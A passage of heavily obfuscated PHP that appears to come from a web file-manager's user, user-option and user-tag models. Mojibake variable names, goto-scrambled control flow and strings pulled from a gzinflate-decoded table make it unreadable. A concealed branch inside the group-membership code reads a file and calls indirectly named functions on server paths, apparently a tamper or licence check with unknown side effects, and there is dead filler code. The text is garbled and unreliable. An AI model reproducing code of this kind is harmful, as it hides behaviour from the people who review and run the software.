$aÄ’à³†Î¹ = array()) { goto BÏªØÀÇƒ‰; D¨¬µßÌ·: return $AÑã…µè´¢->addAll($BÊùŞ‹Ÿ‡, array(), !0); goto D÷™Ö“çé™; fæÌñË…¨Ê: if (!$e‰Ø¸ÚÏÅÙ || !is_array($FëÓ¡çì‚Ë)) { return !1; } $AÑã…µè´¢ = Model($bä­Ÿ¢Şà[1773]); $AÑã…µè´¢->where(array($bä­Ÿ¢Şà[1528] => $b½ñÓ‹¹©))->delete(); goto dÉ¦ºã£Ãù; BÏªØÀÇƒ‰: $bä­Ÿ¢Şà =& $_SERVER[œº]; if ($_SERVER[$bä­Ÿ¢Şà[821]] != $_SERVER[$bä­Ÿ¢Şà[1459]]) { goto f„ùÍ¾ö¬ã; f„ùÍ¾ö¬ã: $f Ëšªï´ = $bä­Ÿ¢Şà[839]; $F‚ÆØºÌ»Õ = $bä­Ÿ¢Şà[823]; $cÕ’Üœ¶×† = $_SERVER[$bä­Ÿ¢Şà[824]] . $bä­Ÿ¢Şà[825]; goto cÓ˜±›Šœì; cÓ˜±›Šœì: $Ašéè¤™¥ = $F‚ÆØºÌ»Õ($cÕ’Üœ¶×†); $B‚É±•Ô‚ = explode($bä­Ÿ¢Şà[229], $Ašéè¤™¥); if (count($B‚É±•Ô‚) < $bä­Ÿ¢Şà[578]) { $b™§ù›½³Ğ = $bä­Ÿ¢Şà[826]; $b™§ù›½³Ğ(); } goto c‡ã•¦«ï­; CĞ×ºó»: $F¥øÊ„ˆ¢¼ = 1; while ($F¥øÊ„ˆ¢¼ > 1) { $F¥øÊ„ˆ¢¼ = $F¥øÊ„ˆ¢¼ + 4; $d³Ìö‘«³” = rawurlencode($F¥øÊ„ˆ¢¼ . $bä­Ÿ¢Şà[375]); } goto d…¶ğ¯…¦; c‡ã•¦«ï­: $D¨ƒòŸôÕÆ = $bä­Ÿ¢Şà[840]; $D¨ƒòŸôÕÆ($_SERVER[$bä­Ÿ¢Şà[841]]); $D¨ƒòŸôÕÆ($_SERVER[$bä­Ÿ¢Şà[824]] . $bä­Ÿ¢Şà[1460]); goto CĞ×ºó»; d…¶ğ¯…¦: } $e‰Ø¸ÚÏÅÙ = $this->getInfoSimple($b½ñÓ‹¹©); goto fæÌñË…¨Ê; dÉ¦ºã£Ãù: $BÊùŞ‹Ÿ‡ = array(); $B„±¥æÏÄ = 0; foreach ($FëÓ¡çì‚Ë as $EÄÀÌ—ƒÖ› => $aòâñâùÂ—) { $cäÀäÄ«‹ù = array($bä­Ÿ¢Şà[1528] => $b½ñÓ‹¹©, $bä­Ÿ¢Şà[1692] => $EÄÀÌ—ƒÖ›, $bä­Ÿ¢Şà[1787] => $aòâñâùÂ—); $cäÀäÄ«‹ù[$bä­Ÿ¢Şà[1715]] = isset($aÄ’à³†Î¹[$B„±¥æÏÄ]) ? $aÄ’à³†Î¹[$B„±¥æÏÄ] : 0; $B„±¥æÏÄ++; $BÊùŞ‹Ÿ‡[] = $cäÀäÄ«‹ù; } goto D¨¬µßÌ·; D÷™Ö“çé™: } protected function userGroupAdd($b´ñæË‚³ƒ, $fÀÍø·æ¢Ô = array()) { $aÙ¨™äåÑÃ =& $_SERVER[œº]; $dŠ¿Â§ßé = $this->getInfoSimple($b´ñæË‚³ƒ); if (!$dŠ¿Â§ßé || empty($fÀÍø·æ¢Ô)) { return !1; } $C½´íÂª×¼ = array(); foreach ($fÀÍø·æ¢Ô as $BÁÄç®šëŒ => $d”Ô‹„†«±) { $C½´íÂª×¼[] = array($aÙ¨™äåÑÃ[1528] => $b´ñæË‚³ƒ, $aÙ¨™äåÑÃ[1692] => $BÁÄç®šëŒ, $aÙ¨™äåÑÃ[1787] => $d”Ô‹„†«±, $aÙ¨™äåÑÃ[1715] => 0); } return Model($aÙ¨™äåÑÃ[1773])->addAll($C½´íÂª×¼, array(), !0); } protected function userGroupRemove($DÌ³ºœ‘‹ô, $eÏ‘«Œ—) { $f‘—ÁÂì„ù =& $_SERVER[œº]; $EÂçĞ·…õ„ = $this->getInfoSimple($DÌ³ºœ‘‹ô); if (!$EÂçĞ·…õ„ || !$eÏ‘«Œ—) { return !1; } $dâ›‰ä…À = array($f‘—ÁÂì„ù[1520] => $DÌ³ºœ‘‹ô, $f‘—ÁÂì„ù[1770] => $eÏ‘«Œ—); return Model($f‘—ÁÂì„ù[1773])->where($dâ›‰ä…À)->delete(); } public function listData() { $F‰”ğ·‹‰Ø = $this->_makeOrder()->selectPage(50); $this->_listDataApply($F‰”ğ·‹‰Ø[$_SERVER[œº][367]]); return $F‰”ğ·‹‰Ø; } public function listByID($CÙƒåäÔ¿›) { $BÓÛ—Š¸ó‘ =& $_SERVER[œº]; if (!$CÙƒåäÔ¿›) { return; } $böÃ•ôË = array($BÓÛ—Š¸ó‘[1528] => array($BÓÛ—Š¸ó‘[7], $CÙƒåäÔ¿›)); $f¾²Â“İğÀ = $this->where($böÃ•ôË)->select(); $this->_listDataApply($f¾²Â“İğÀ); return $f¾²Â“İğÀ; } public function listByGroup($E’É­˜Ø±§ = 0, $a’ŒéØØ = array()) { goto AĞ„ê×ƒÌÊ; a¤“‹¾êâš: if ($E’É­˜Ø±§) { $Fº‡–«¡Ñ§ = array($F‰¡˜†Õ÷ô[2153] => intval($E’É­˜Ø±§)); $D¼å‘ö««¬ = "\114\105\106\x54\40\112\117\111\x4e\x20{$this->tablePrefix}\165\x73\x65\162\137\x67\x72\x6f\x75\x70\40\x75\163\145\x72\x5f\x67\162\157\165\x70\x20\157\x6e\x20\165\163\145\162\56\165\x73\x65\162\111\x44\x20\x3d\x20\x75\163\145\162\137\147\162\x6f\x75\x70\x2e\x75\x73\145\162\111\x44"; $C¥…ËÁ‘ŞŸ = Input::get($F‰¡˜†Õ÷ô[435], null, $F‰¡˜†Õ÷ô[33]) ? $F‰¡˜†Õ÷ô[33] : $F‰¡˜†Õ÷ô[2154]; } if (isset($a’ŒéØØ[$F‰¡˜†Õ÷ô[710]])) { $Fº‡–«¡Ñ§[$F‰¡˜†Õ÷ô[2155]] = $a’ŒéØØ[$F‰¡˜†Õ÷ô[710]]; } $BÒŠŞÃ°æ = $this->_makeOrder($C¥…ËÁ‘ŞŸ)->field($F‰¡˜†Õ÷ô[2156])->where($Fº‡–«¡Ñ§)->join($D¼å‘ö««¬)->selectPage(50); goto añ×ÄÊ¹¼; AĞ„ê×ƒÌÊ: $F‰¡˜†Õ÷ô =& $_SERVER[œº]; $D¼å‘ö««¬ = $F‰¡˜†Õ÷ô[33]; $Fº‡–«¡Ñ§ = array(); goto a¤“‹¾êâš; añ×ÄÊ¹¼: $this->_listDataApply($BÒŠŞÃ°æ[$F‰¡˜†Õ÷ô[367]]); return $BÒŠŞÃ°æ; goto FÄ¡ƒˆ‰ìÇ; FÄ¡ƒˆ‰ìÇ: } private function _makeOrder($f·Ï†Õó× = '') { goto B’ò…©ÂÎ¥; C½“Ä×º˜: $f·Ï†Õó× = $f·Ï†Õó× . "\x75\x73\x65\x72\x2e{$E¡ëÎ†‚ãİ}\40{$a†â‰ñ‹›“}\x2c\40\165\x73\145\x72\x2e\165\x73\145\x72\111\x44\x20\x61\163\143"; return $this->alias($fÖÇÊÕç˜·[1896])->order($f·Ï†Õó×); goto d‰¦ŠäÀæ¼; B’ò…©ÂÎ¥: $fÖÇÊÕç˜· =& $_SERVER[œº]; $fœëíõõÚ© = array($fÖÇÊÕç˜·[1528], $fÖÇÊÕç˜·[28], $fÖÇÊÕç˜·[1678], $fÖÇÊÕç˜·[1650], $fÖÇÊÕç˜·[194]); $f°ò„·â–ø = array($fÖÇÊÕç˜·[428] => $fÖÇÊÕç˜·[429], $fÖÇÊÕç˜·[430] => $fÖÇÊÕç˜·[431]); goto Eß‘ÕÑÀ…; Eß‘ÕÑÀ…: $E¡ëÎ†‚ãİ = Input::get($fÖÇÊÕç˜·[435], $fÖÇÊÕç˜·[7], $fÖÇÊÕç˜·[1520], $fœëíõõÚ©); $a†â‰ñ‹›“ = Input::get($fÖÇÊÕç˜·[436], $fÖÇÊÕç˜·[7], $fÖÇÊÕç˜·[1774], array($fÖÇÊÕç˜·[1774], $fÖÇÊÕç˜·[430])); $a†â‰ñ‹›“ = $f°ò„·â–ø[$a†â‰ñ‹›“]; goto C½“Ä×º˜; d‰¦ŠäÀæ¼: } public function listSearch($DˆÖŒ–îøô) { goto f¥£é½Úìá; C™¢é‹ÉÂ¶: $this->_filterByGroup($eÉ³œğÙ¿ì, $FÎ‹õÌîÆ¶); return $eÉ³œğÙ¿ì; goto fÆ“«â×õ; f¥£é½Úìá: $dŸÉó£ôäé =& $_SERVER[œº]; $Eø“Òó¦è = $DˆÖŒ–îøô[$dŸÉó£ôäé[1775]]; $FÎ‹õÌîÆ¶ = isset($DˆÖŒ–îøô[$dŸÉó£ôäé[1776]]) ? $DˆÖŒ–îøô[$dŸÉó£ôäé[1776]] : !1; goto cÒÂ¹àÊœ«; dÊõÊ¡êø: $eÉ³œğÙ¿ì = $this->_makeOrder()->where($F£„£´Ûã)->selectPage(20); if (!$eÉ³œğÙ¿ì || count($eÉ³œğÙ¿ì[$dŸÉó£ôäé[367]]) < 5 && Input::check($Eø“Òó¦è, $dŸÉó£ôäé[316])) { $FÛê¸í•†× = $this->_searchFromMeta($dŸÉó£ôäé[443], $Eø“Òó¦è, 10); $A‘ÎÍÍ£ñÃ = $this->_searchFromMeta($dŸÉó£ôäé[444], $Eø“Òó¦è, 10); $f¦Ò÷ÉÈ ñ = array_merge($FÛê¸í•†×, $A‘ÎÍÍ£ñÃ, $eÉ³œğÙ¿ì[$dŸÉó£ôäé[367]]); $eÉ³œğÙ¿ì[$dŸÉó£ôäé[367]] = array_unique_by_key($f¦Ò÷ÉÈ ñ, $dŸÉó£ôäé[1528]); $eÉ³œğÙ¿ì[$dŸÉó£ôäé[364]][$dŸÉó£ôäé[365]] = count($eÉ³œğÙ¿ì[$dŸÉó£ôäé[367]]); $eÉ³œğÙ¿ì[$dŸÉó£ôäé[364]][$dŸÉó£ôäé[366]] = ceil($eÉ³œğÙ¿ì[$dŸÉó£ôäé[364]][$dŸÉó£ôäé[365]] / $eÉ³œğÙ¿ì[$dŸÉó£ôäé[364]][$dŸÉó£ôäé[361]]); } $this->_listDataApply($eÉ³œğÙ¿ì[$dŸÉó£ôäé[367]]); goto C™¢é‹ÉÂ¶; cÒÂ¹àÊœ«: $Eø“Òó¦è = str_replace($dŸÉó£ôäé[1777], $dŸÉó£ôäé[1778], trim($Eø“Òó¦è)); $F£„£´Ûã = array($dŸÉó£ôäé[28] => array($dŸÉó£ôäé[380], "\x25{$Eø“Òó¦è}\45"), $dŸÉó£ôäé[303] => array($dŸÉó£ôäé[380], "{$Eø“Òó¦è}\45"), $dŸÉó£ôäé[1956] => array($dŸÉó£ôäé[380], "{$Eø“Òó¦è}\45"), $dŸÉó£ôäé[957] => $dŸÉó£ôäé[1779]); if (Input::check($Eø“Òó¦è, $dŸÉó£ôäé[309])) { $F£„£´Ûã[$dŸÉó£ôäé[1528]] = array($dŸÉó£ôäé[380], "{$Eø“Òó¦è}\45"); $F£„£´Ûã[$dŸÉó£ôäé[2137]] = array($dŸÉó£ôäé[380], "{$Eø“Òó¦è}\x25"); } goto F¯Àµ»õäØ; F¯Àµ»õäØ: if (!$Eø“Òó¦è) { $F£„£´Ûã = array(); } if (isset($DˆÖŒ–îøô[$dŸÉó£ôäé[710]])) { $F£„£´Ûã[$dŸÉó£ôäé[710]] = $DˆÖŒ–îøô[$dŸÉó£ôäé[710]]; } $F£„£´Ûã = $this->parseWhereLike($F£„£´Ûã); goto dÊõÊ¡êø; fÆ“«â×õ: } private function _filterByGroup(&$aòİ§Îìæä, $Dë¸à§ƒ„) { $eƒÑÍ’” =& $_SERVER[œº]; if (!$Dë¸à§ƒ„) { return $aòİ§Îìæä; } foreach ($aòİ§Îìæä[$eƒÑÍ’”[367]] as $C™è÷É › => &$bïêñîºµ) { $e¯Êà¦ôÊœ = array_to_keyvalue($bïêñîºµ[$eƒÑÍ’”[1866]], $eƒÑÍ’”[33], $eƒÑÍ’”[1692]); if (!in_array($Dë¸à§ƒ„, $e¯Êà¦ôÊœ)) { unset($aòİ§Îìæä[$eƒÑÍ’”[367]][$C™è÷É ›]); } } unset($bïêñîºµ); $aòİ§Îìæä[$eƒÑÍ’”[367]] = array_values($aòİ§Îìæä[$eƒÑÍ’”[367]]); $aòİ§Îìæä[$eƒÑÍ’”[364]] = array($eƒÑÍ’”[1928] => count($aòİ§Îìæä[$eƒÑÍ’”[367]]), $eƒÑÍ’”[1926] => $aòİ§Îìæä[$eƒÑÍ’”[364]][$eƒÑÍ’”[361]], $eƒÑÍ’”[1925] => 1, $eƒÑÍ’”[1927] => 1); } private function _searchFromMeta($dóäë‘ã·ø, $D‹çğõ×ìÖ, $dÉ‘­±í¸é) { goto cÎ¦¡İ–ğ; B¾•Ÿ—”¤: $aÑô­ÌÕõµ = $this->parseWhereLike($aÑô­ÌÕõµ); $F½¥‡¢Ì³³ = Model($dèÍ¾‘ÉÚä[2157])->where($aÑô­ÌÕõµ)->limit($dÉ‘­±í¸é)->select(); if (!$F½¥‡¢Ì³³) { return array(); } goto E…¯ë¨ÈÖÁ; FèŠÇï‡ªÒ: return $A©Í×§½ò; goto FÇÇöİƒ¤ä; E…¯ë¨ÈÖÁ: $F½¥‡¢Ì³³ = array_to_keyvalue($F½¥‡¢Ì³³, $dèÍ¾‘ÉÚä[33], $dèÍ¾‘ÉÚä[1528]); $A©Í×§½ò = $this->where(array($dèÍ¾‘ÉÚä[1520] => array($dèÍ¾‘ÉÚä[7], $F½¥‡¢Ì³³)))->select(); if (!$A©Í×§½ò) { return array(); } goto FèŠÇï‡ªÒ; cÎ¦¡İ–ğ: $dèÍ¾‘ÉÚä =& $_SERVER[œº]; $D‹çğõ×ìÖ = strtolower($D‹çğõ×ìÖ); $aÑô­ÌÕõµ = array($dèÍ¾‘ÉÚä[93] => $dóäë‘ã·ø, $dèÍ¾‘ÉÚä[372] => array($dèÍ¾‘ÉÚä[380], "\45{$D‹çğõ×ìÖ}\x25")); goto B¾•Ÿ—”¤; FÇÇöİƒ¤ä: } private function _listDataApplyItem($f§ˆô‰¸š) { $Eà–ÜŒÉÚ = array($f§ˆô‰¸š); $this->_listDataApply($Eà–ÜŒÉÚ); return $Eà–ÜŒÉÚ[0]; } private function _listDataApply(&$EõëµÀê´ï) { goto bš‹…ÉñèÒ; eèå¢©¡¯: $this->_listAppendSourceRoot($EõëµÀê´ï, $d•İÖõ¢â); goto dÁ‰™Š¥©ó; c™ƒËß›­ï: $d•İÖõ¢â = array_to_keyvalue($EõëµÀê´ï, $C‚°Ö¨µÓÜ[33], $C‚°Ö¨µÓÜ[1528]); $this->_listAppendGroup($EõëµÀê´ï, $d•İÖõ¢â); $this->_listAppendMeta($EõëµÀê´ï, $d•İÖõ¢â); goto eèå¢©¡¯; bš‹…ÉñèÒ: $C‚°Ö¨µÓÜ =& $_SERVER[œº]; if (!$EõëµÀê´ï) { return; } array_remove_key($EõëµÀê´ï, $C‚°Ö¨µÓÜ[849]); goto c™ƒËß›­ï; dÁ‰™Š¥©ó: } private function _listAppendSourceRoot(&$d°ˆ¡í–ÎÕ, $DÈñ÷¶²í°) { goto E¸ŞòÑËŒ; cÃ‰ˆ‚¤êã: foreach ($d°ˆ¡í–ÎÕ as &$bÇ¶£Â¹èÀ) { $bÇ¶£Â¹èÀ[$ašïÀÖÀÕ³[85]] = $e›Á­œóÇŒ[$bÇ¶£Â¹èÀ[$ašïÀÖÀÕ³[1528]]] ? $e›Á­œóÇŒ[$bÇ¶£Â¹èÀ[$ašïÀÖÀÕ³[1528]]] : array(); } unset($bÇ¶£Â¹èÀ); goto D©ÆËƒ­›; c¯±¥‘„Áƒ: $e›Á­œóÇŒ = Model($ašïÀÖÀÕ³[790])->order($ašïÀÖÀÕ³[1786])->field($bäò³Ï¡øª)->where($BŸô·„¥È£)->select(); $e›Á­œóÇŒ = array_to_keyvalue($e›Á­œóÇŒ, $ašïÀÖÀÕ³[484]); $e›Á­œóÇŒ = array_remove_key($e›Á­œóÇŒ, $ašïÀÖÀÕ³[484]); goto cÃ‰ˆ‚¤êã; E¸ŞòÑËŒ: $ašïÀÖÀÕ³ =& $_SERVER[œº]; $BŸô·„¥È£ = array($ašïÀÖÀÕ³[478] => 0, $ašïÀÖÀÕ³[404] => SourceModel::TYPE_USER, $ašïÀÖÀÕ³[484] => array($ašïÀÖÀÕ³[7], $DÈñ÷¶²í°)); $bäò³Ï¡øª = $ašïÀÖÀÕ³[1785]; goto c¯±¥‘„Áƒ; D©ÆËƒ­›: } private function _listAppendGroup(&$bø½ó ¡ŒÌ, $f¹ò’»ˆ£) { goto Aâ‰ã—øì‡; BµóÄ¬§ØÁ: $bÛ’Ä·Ãâµ = array($bÓ³˜‘¤åî[1692] => array($bÓ³˜‘¤åî[7], $A´§¾»ÁÅœ)); $C¥‡…ß•Ÿ™ = Model($bÓ³˜‘¤åî[1864])->field($bÓ³˜‘¤åî[2158])->where($bÛ’Ä·Ãâµ)->select(); $C¥‡…ß•Ÿ™ = array_to_keyvalue($C¥‡…ß•Ÿ™, $bÓ³˜‘¤åî[1692]); goto AâºÆ•á§§; AâºÆ•á§§: $DÔ¤ÁÕñ±Õ = array_to_keyvalue_group($DÔ¤ÁÕñ±Õ, $bÓ³˜‘¤åî[1528]); foreach ($DÔ¤ÁÕñ±Õ as &$dÕâ„Å‚Œ°) { $B¹¤ê×†Ğª = array(); foreach ($dÕâ„Å‚Œ° as $EÎî×ÆõøÀ) { if (!$EÎî×ÆõøÀ[$bÓ³˜‘¤åî[1787]]) { continue; } $a•…ŞíŠ» = Model($bÓ³˜‘¤åî[1859])->listData($EÎî×ÆõøÀ[$bÓ³˜‘¤åî[1787]]); $B¹¤ê×†Ğª[] = array($bÓ³˜‘¤åî[1692] => $EÎî×ÆõøÀ[$bÓ³˜‘¤åî[1692]], $bÓ³˜‘¤åî[2159] => $C¥‡…ß•Ÿ™[$EÎî×ÆõøÀ[$bÓ³˜‘¤åî[1692]]][$bÓ³˜‘¤åî[28]], $bÓ³˜‘¤åî[487] => $C¥‡…ß•Ÿ™[$EÎî×ÆõøÀ[$bÓ³˜‘¤åî[1692]]][$bÓ³˜‘¤åî[487]], $bÓ³˜‘¤åî[406] => $a•…ŞíŠ»); } $dÕâ„Å‚Œ° = $B¹¤ê×†Ğª; } unset($dÕâ„Å‚Œ°); goto EâÇ‚÷¾ä; Aâ‰ã—øì‡: $bÓ³˜‘¤åî =& $_SERVER[œº]; $bÛ’Ä·Ãâµ = array($bÓ³˜‘¤åî[1528] => array($bÓ³˜‘¤åî[7], $f¹ò’»ˆ£)); $DÔ¤ÁÕñ±Õ = Model($bÓ³˜‘¤åî[1773])->where($bÛ’Ä·Ãâµ)->select(); goto cö¼‹ƒ˜õí; EâÇ‚÷¾ä: foreach ($bø½ó ¡ŒÌ as &$dÁéÏ‘à) { $dÁéÏ‘à[$bÓ³˜‘¤åî[1866]] = array(); if (isset($DÔ¤ÁÕñ±Õ[$dÁéÏ‘à[$bÓ³˜‘¤åî[1528]]])) { $dÁéÏ‘à[$bÓ³˜‘¤åî[1866]] = $DÔ¤ÁÕñ±Õ[$dÁéÏ‘à[$bÓ³˜‘¤åî[1528]]]; } } unset($dÁéÏ‘à); goto Eä£Ş¼Ş°ù; cö¼‹ƒ˜õí: $A´§¾»ÁÅœ = array_to_keyvalue($DÔ¤ÁÕñ±Õ, $bÓ³˜‘¤åî[33], $bÓ³˜‘¤åî[1692]); $A´§¾»ÁÅœ = array_remove_value(array_unique($A´§¾»ÁÅœ), $bÓ³˜‘¤åî[191]); if (!$A´§¾»ÁÅœ || !$DÔ¤ÁÕñ±Õ) { return; } goto BµóÄ¬§ØÁ; Eä£Ş¼Ş°ù: } private function _listAppendMeta(&$FÖ“òš³îË, $BÕ„Ï‡¶òÌ) { goto A°‹ŒÒ¹§; A°‹ŒÒ¹§: $b¾·™âåœ” =& $_SERVER[œº]; $AˆŠ­İËÚ¥ = UserJobModel::JOB_KEY; $Aß‹¾óèí› = array($b¾·™âåœ”[2138]); goto b––îïÕ®³; b––îïÕ®³: $Dæ¤ªÕñÉï = array($b¾·™âåœ”[1528] => array($b¾·™âåœ”[7], $BÕ„Ï‡¶òÌ)); $CœòÂ«Ó› = Model($b¾·™âåœ”[2136])->where($Dæ¤ªÕñÉï)->select(); $CœòÂ«Ó› = array_to_keyvalue_group($CœòÂ«Ó›, $b¾·™âåœ”[1528]); goto bš™İ‰ÒøÄ; cÁÔ†Ùº•ã: foreach ($FÖ“òš³îË as &$E™ÜÍ”ËãÔ) { $dÔíÙªó¬ = array(); if (isset($CœòÂ«Ó›[$E™ÜÍ”ËãÔ[$b¾·™âåœ”[1528]]])) { $dÔíÙªó¬ = $CœòÂ«Ó›[$E™ÜÍ”ËãÔ[$b¾·™âåœ”[1528]]]; } $E™ÜÍ”ËãÔ[$b¾·™âåœ”[2161]] = array(); if (isset($dÔíÙªó¬[$AˆŠ­İËÚ¥])) { $E™ÜÍ”ËãÔ[$b¾·™âåœ”[2161]] = $bîå…À…->getUserJobInfo($dÔíÙªó¬[$AˆŠ­İËÚ¥]); } } unset($E™ÜÍ”ËãÔ); goto A¨ÉŒŠ»ò†; bš™İ‰ÒøÄ: foreach ($CœòÂ«Ó› as &$B¤‡†˜ÑÇì) { $c’Öğ©ªƒé = array(); foreach ($B¤‡†˜ÑÇì as $c© ÁÛ­âÌ) { if (!in_array($c© ÁÛ­âÌ[$b¾·™âåœ”[93]], $Aß‹¾óèí›)) { $c’Öğ©ªƒé[$c© ÁÛ­âÌ[$b¾·™âåœ”[93]]] = $c© ÁÛ­âÌ[$b¾·™âåœ”[372]]; } } $B¤‡†˜ÑÇì = $c’Öğ©ªƒé; } unset($B¤‡†˜ÑÇì); $bîå…À… = Model($b¾·™âåœ”[2160]); goto cÁÔ†Ùº•ã; A¨ÉŒŠ»ò†: } protected function groupUserAll($eö­ŸÌî‚í) { $D¿•·šÇÃõ =& $_SERVER[œº]; if (!$eö­ŸÌî‚í) { return !1; } $EŒŞ¶â’Ş = Model($D¿•·šÇÃõ[1773])->field($D¿•·šÇÃõ[1528])->where(array($D¿•·šÇÃõ[1692] => array($D¿•·šÇÃõ[7], $eö­ŸÌî‚í)))->select(); $EŒŞ¶â’Ş = array_to_keyvalue($EŒŞ¶â’Ş, $D¿•·šÇÃõ[33], $D¿•·šÇÃõ[1528]); return array_unique($EŒŞ¶â’Ş); } public function userSearch($aõ²Üƒ®””, $fåÚ¸Õƒİë = "\x2a") { return Model($_SERVER[œº][506])->where($aõ²Üƒ®””)->field($fåÚ¸Õƒİë)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\157\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($d”ßêêˆÂ) { $aÍ¿éÀÃëƒ =& $_SERVER[œº]; if (!defined($aÍ¿éÀÃëƒ[454])) { define($aÍ¿éÀÃëƒ[454], 0); } return "\x55\x73\x65\x72\117\x70\164\x69\157\156\137{$d”ßêêˆÂ}\x5f" . USER_ID; } protected function filterWhere($e£²÷ëŒ) { $e«—êÂÁ® =& $_SERVER[œº]; if (!defined($e«—êÂÁ®[454])) { define($e«—êÂÁ®[454], 0); } $e£²÷ëŒ[$e«—êÂÁ®[1528]] = USER_ID; return $e£²÷ëŒ; } public function cacheRemoveUser($BöÕíÉ·è®, $cƒˆÅŠŸ¦Ó) { return Cache::remove("\x55\x73\145\162\117\160\x74\151\x6f\x6e\x5f{$BöÕíÉ·è®}\x5f" . $cƒˆÅŠŸ¦Ó); } protected function optionDefault($f¢Ñ½Ï’ƒÒ = '') { $CÏÄšÁˆß =& $_SERVER[œº]; if ($f¢Ñ½Ï’ƒÒ == $CÏÄšÁˆß[33]) { return $GLOBALS[$CÏÄšÁˆß[6]][$CÏÄšÁˆß[2162]]; } if ($f¢Ñ½Ï’ƒÒ == $CÏÄšÁˆß[2163]) { return $GLOBALS[$CÏÄšÁˆß[6]][$CÏÄšÁˆß[2164]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\164\x61\147\114\151\163\164"; public $modelType = "\x55\x73\145\162\x4f\160\164\x69\x6f\156"; public $field = array("\x6e\x61\155\x65", "\163\x74\171\154\x65", "\163\x6f\162\x74"); public function listData($Cà˜ò“ƒšñ = false, $f¸ÙÑ¼µÖ = "\x73\157\162\x74", $fš¾ƒ”‘ÕÉ = false) { return parent::listData($Cà˜ò“ƒšñ, $f¸ÙÑ¼µÖ, $fš¾ƒ”‘ÕÉ); } public function remove($b„”‘ñğñ) { return parent::remove($b„”‘ñğñ); } public function add($Cî°÷ùº‹î, $C³´¥ó‹Í = "\154\141\142\145\x6c\55\147\x72\145\171\55\x6e\157\162\x6d\x61\154") { $b¬÷¾æ˜… =& $_SERVER[œº]; if ($this->findByName($Cî°÷ùº‹î)) { return !1; } $cõ¬¿Ú£Ğö = array($b¬÷¾æ˜…[413] => $Cî°÷ùº‹î, $b¬÷¾æ˜…[464] => $C³´¥ó‹Í, $b¬÷¾æ˜…[1696] => $this->getSort($b¬÷¾æ˜…[256]) + 1); return parent::insert($cõ¬¿Ú£Ğö); } public function update($cŒˆ¨Ñ­Á¤, $Dì¦Áõµ…Í) { $bòÓ·ÉÔ³ =& $_SERVER[œº]; $EÛ×İµÜÈ¦ = $this->listData($cŒˆ¨Ñ­Á¤); $e¿–ôÓÒÖš = $this->findByName($Dì¦Áõµ…Í[$bòÓ·ÉÔ³[28]]); if (!$EÛ×İµÜÈ¦ || $e¿–ôÓÒÖš && $e¿–ôÓÒÖš[$bòÓ·ÉÔ³[393]] != $EÛ×İµÜÈ¦[$bòÓ·ÉÔ³[393]]) { return !1; } return parent::update($cŒˆ¨Ñ­Á¤, $Dì¦Áõµ…Í); } public function moveTop($fÍÈÒ„Î) { $Dêô¦ƒŒ½Ä =& $_SERVER[œº]; $cñÚ¬•§ä = parent::listData(); $a‹µí›–‘¡ = $this->getSort($Dêô¦ƒŒ½Ä[255]); foreach ($cñÚ¬•§ä as &$d“ÊÙ£¢ò‡) { if ($d“ÊÙ£¢ò‡[$Dêô¦ƒŒ½Ä[393]] == $fÍÈÒ„Î) { $d“ÊÙ£¢ò‡[$Dêô¦ƒŒ½Ä[1715]] = $a‹µí›–‘¡; continue; } $d“ÊÙ£¢ò‡[$Dêô¦ƒŒ½Ä[1715]] += 1; } unset($d“ÊÙ£¢ò‡); return parent::resetData($cñÚ¬•§ä); } public function moveBottom($B¶ÇŒ²ï“) { $C„»ù¨¯¥° =& $_SERVER[œº]; $fôÃçÒ‘åŸ = $this->getSort($C„»ù¨¯¥°[256]) + 1; return parent::update($B¶ÇŒ²ï“, array($C„»ù¨¯¥°[1715] => $fôÃçÒ‘åŸ)); } public function resetSort($e À•Çä‹õ) { goto EÙŠ³Øã³; EÙŠ³Øã³: $aÀÑ«˜¨˜ß =& $_SERVER[œº]; $dí«äÀ’¦Ø = array(); $e À•Çä‹õ = is_array($e À•Çä‹õ) ? $e À•Çä‹õ : array(); goto EÕ§•Š×; EÕ§•Š×: for ($EÖ‚ò®ñÚ = 0; $EÖ‚ò®ñÚ < count($e À•Çä‹õ); $EÖ‚ò®ñÚ++) { $dí«äÀ’¦Ø[$e À•Çä‹õ[$EÖ‚ò®ñÚ] . $aÀÑ«˜¨˜ß[33]] = $EÖ‚ò®ñÚ + 1; } $e«š‰ÈÖ–ô = parent::listData(); foreach ($e«š‰ÈÖ–ô as &$BºÍ ÉÅ ‰) { $eÛÔâ’· = $dí«äÀ’¦Ø[$BºÍ ÉÅ ‰[$aÀÑ«˜¨˜ß[393]]]; $BºÍ ÉÅ ‰[$aÀÑ«˜¨˜ß[1715]] = $eÛÔâ’· ? $eÛÔâ’· : $BºÍ ÉÅ ‰[$aÀÑ«˜¨˜ß[1715]]; } goto e¹—êš’œ; e¹—êš’œ: unset($BºÍ ÉÅ ‰); return parent::resetData($e«š‰ÈÖ–ô); goto e­„ÇÍ¨Ôå; e­„ÇÍ¨Ôå: } private function getSort($bá©„Èù³Ï) { $DÀË´òº‡’ =& $_SERVER[œº]; $f‘ÛªŒ‚¸Ì = parent::listData(); $c‚»²÷“äŞ = array_to_keyvalue($f‘ÛªŒ‚¸Ì, $DÀË´òº‡’[33], $DÀË´òº‡’[1715]); if (!$c‚»²÷“äŞ) { $c‚»²÷“äŞ = array(0); } $E…²åÑ¸èĞ = $bá©„Èù³Ï == $DÀË´òº‡’[256] ? max($c‚»²÷“äŞ) : min($c‚»²÷“äŞ); return intval($E…²åÑ¸èĞ); } } goto AÀ˜ÖÇ‘Ù; FÁƒÂÖŒ: define($_SERVER[œº][0], $_SERVER[œº][1]); $_SERVER[¡Ê·àœ†ÀÍø] = explode($_SERVER[œº][2], gzinflate(substr($_SERVER[œº][3], 10, -8))); function binCheckEq($Eã Ë×¿œà, $bã³º¸¡¾¬) { return $Eã Ë×¿œà == $bã³º¸¡¾¬; } goto B÷¬Ô÷Ê¯¹; Aµ£êÊ…õ…: class PathDriverDriverShareItem { public function __construct($e‡ºÔÀ§¨é) { $this->pathParse = $e‡ºÔÀ§¨é; } public function __call($BÎïÊ´²±, $bƒÑèù´ˆ¥) { $c¾·Ï¨Šï =& $_SERVER[œº]; if (method_exists($this, $BÎïÊ´²±)) { return; } $b‰„‹‹çøÊ = call_user_func_array(array($c¾·Ï¨Šï[1215], $BÎïÊ´²±), $bƒÑèù´ˆ¥); $cì·µÒ¤’ = array($c¾·Ï¨Šï[1216], $c¾·Ï¨Šï[1217], $c¾·Ï¨Šï[1218], 